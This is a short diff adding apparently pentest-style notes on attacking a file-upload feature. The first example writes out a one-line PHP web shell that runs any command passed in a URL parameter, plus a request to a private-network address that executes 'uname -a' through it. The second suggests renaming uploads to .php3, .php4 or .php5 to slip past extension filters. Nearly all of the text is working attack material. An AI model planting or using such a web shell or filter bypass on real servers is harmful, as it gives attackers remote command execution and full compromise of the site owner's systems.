@@ -1,0 +1,9 @@
+example1:
+upload a.php:
+<?php
+  system($_GET["cmd"]);
+?>
+http://192.168.184.128/upload/images/a.php?cmd=uname -a
+
+example2:
+rename the extension to .php3  [some systems will work on .php4 or .php5, it depends on the configuration of the web server.]
